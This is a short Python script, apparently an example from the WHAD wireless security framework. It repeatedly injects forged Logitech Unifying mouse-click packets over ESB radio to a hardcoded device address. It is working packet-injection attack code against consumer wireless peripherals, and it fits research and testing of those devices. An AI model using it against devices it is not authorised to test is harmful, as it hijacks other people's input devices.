from whad.unifying import Injector
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.scapy.layers.esb import *
from whad.scapy.layers.unifying import *
from scapy.compat import raw
import sys,time


if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            connector = Injector(dev)
            #connector.address =  "ca:e9:06:ec:a4"
            connector.autosync = True

            while True:
                print(connector.inject(ESB_Hdr(address="ca:e9:06:ec:a4") / ESB_Payload_Hdr() / Logitech_Unifying_Hdr() / Logitech_Mouse_Payload(button_mask=2)))
                time.sleep(1)
        except (KeyboardInterrupt, SystemExit):
            connector.stop()
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
